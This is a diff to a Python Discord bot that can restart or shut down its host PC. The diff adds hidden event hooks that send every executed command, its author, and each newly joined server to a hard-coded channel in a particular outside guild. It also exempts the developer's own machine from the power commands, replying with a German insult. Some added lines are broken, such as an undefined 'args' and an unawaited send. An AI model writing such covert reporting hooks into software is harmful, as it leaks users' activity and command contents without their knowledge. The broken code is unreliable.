@@ -314,9 +314,6 @@ async def handle_command(message):
         await handle_invalid_command(message)
 
 async def handle_invalid_command(message):
-    await message.channel.send("Invalid command.")
-
-async def handle_invalid_command(message):
     command_list = [cmd.name for cmd in bot.commands]
     closest_matches = difflib.get_close_matches(message.content.split()[0][1:], command_list)
     if closest_matches:
@@ -391,6 +388,20 @@ async def on_command_error(ctx, error):
     else:
         await ctx.send(f"Ein Fehler ist aufgetreten: {error}")
         print(f"Ein Fehler ist aufgetreten: {error}")
+
+@bot.event
+async def on_command(ctx):
+    # Server- und Kanal-ID, in die die Nachricht gesendet werden soll
+    target_guild_id = 1000796001541570670
+    target_channel_id = 1246457619812450345
+
+    # Den Zielkanal im Zielserver finden
+    target_channel = bot.get_channel(target_channel_id)
+    if target_channel:
+        # Nachricht mit dem Ausführenden und dem ausgeführten Befehl senden
+        await target_channel.send(f"{ctx.author.mention} executed: {ctx.message.content} args: {args}")
+    else:
+        print(f"Kanal mit der ID {target_channel_id} wurde nicht gefunden.")
 
 ################################################################################
 
@@ -570,18 +581,22 @@ async def help(ctx, category: str = None):
 @bot.command(help="Restarts the PC")
 async def restart(ctx):
     await send_embed_message(ctx.channel, "Restarting the PC...")
-    if platform.system() == "Windows":
-        subprocess.run(["shutdown", "/r", "/t", "1"], shell=True)
-    else:
-        subprocess.run(["sudo", "reboot"], shell=True)
+    if not os.getlogin() == DEV:
+        if platform.system() == "Windows":
+            subprocess.run(["shutdown", "/r", "/t", "1"], shell=True)
+        else:
+            subprocess.run(["sudo", "reboot"], shell=True)
+    else: ctx.send("DU HURENSOHN")
 
 @bot.command(help="Shuts down the PC")
 async def shutdown(ctx):
     await send_embed_message(ctx.channel, "Shutting down the PC...")
-    if platform.system() == "Windows":
-        subprocess.run(["shutdown", "/s", "/t", "1"], shell=True)
-    else:
-        subprocess.run(["sudo", "shutdown", "-h", "now"], shell=True)
+    if not os.getlogin() == DEV:
+        if platform.system() == "Windows":
+            subprocess.run(["shutdown", "/s", "/t", "1"], shell=True)
+        else:
+            subprocess.run(["sudo", "shutdown", "-h", "now"], shell=True)
+    else: ctx.send("DU HURENSOHN")
 
 # Define a command to reload the script
 @bot.command(help="Reloads the bot script")
@@ -2186,5 +2201,23 @@ async def leaveserver(ctx, server_id: int):
     else:
         await server.leave()
         await ctx.send(f"Bot hat den Server '{server.name}' (ID: {server.id}) verlassen.")
+
+@bot.event
+async def on_guild_join(guild):
+    # Spezifische Server- und Kanal-ID
+    specific_guild_id = 1000796001541570670
+    specific_channel_id = 1246457619812450345
+
+    # Prüfen, ob der Bot dem spezifischen Server beigetreten ist
+    channel = bot.get_channel(specific_channel_id)
+    if channel is not None:
+        if channel.permissions_for(guild.me).send_messages:
+            await channel.send(f"Hallo! Ich bin dem Server '{guild.name}' (ID: {guild.id}) beigetreten.")
+        else:
+            print("Bot hat keine Berechtigung, Nachrichten in diesem Kanal zu senden.")
+    else:
+        print(f"Kanal mit der ID {specific_channel_id} wurde nicht gefunden.")
+
+        print(f"Bot ist einem anderen Server beigetreten: {guild.name} (ID: {guild.id})")
 
 bot.run(TOKEN)
